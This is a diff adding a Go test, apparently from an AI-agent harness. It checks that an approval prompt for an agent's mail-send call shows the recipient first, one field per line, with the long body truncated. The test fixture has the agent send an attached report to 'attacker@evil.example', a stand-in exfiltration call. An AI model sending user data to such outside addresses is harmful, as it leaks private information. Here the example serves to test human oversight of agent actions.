@@ -479,3 +479,34 @@ func TestADecisionSaysWhoAsksWhyAndWhatChanges(t *testing.T) {
 		}
 	}
 }
+
+// TestAConfirmationShowsTheRecipientFirst: a call with a long body shows its fields a line each, the recipient first,
+// each long value cut on its own.
+func TestAConfirmationShowsTheRecipientFirst(t *testing.T) {
+	t.Parallel()
+	body := strings.Repeat("Hello team, the report is attached. ", 20)
+	e := harness.New(t, harness.WithAgent(func(ctx context.Context, c *harness.Call) provider.Result {
+		c.Approve(ctx, "mcp__mail__send", map[string]any{"body": body, "subject": "report", "to": "attacker@evil.example"})
+		return provider.Result{}
+	}))
+	p := e.Project("ask", harness.TestManifest([]string{harness.AgentCommand("job", "")}, nil))
+	e.Run(p, "job")
+	a := e.WaitAsk()
+	var rows []struct {
+		ID     int64
+		Change string
+	}
+	e.Must("deck.asks_list", map[string]any{}, &rows)
+	for _, r := range rows {
+		if r.ID != a.ID {
+			continue
+		}
+		lines := strings.Split(r.Change, "\n")
+		if len(lines) != 3 || lines[0] != "to: attacker@evil.example" || lines[1] != "subject: report" ||
+			!strings.HasPrefix(lines[2], "body: Hello team") || len(lines[2]) > 220 {
+			t.Fatalf("the fields a line each, the recipient first, the body cut on its own: %q", r.Change)
+		}
+		return
+	}
+	t.Fatalf("no ask %d in %+v", a.ID, rows)
+}
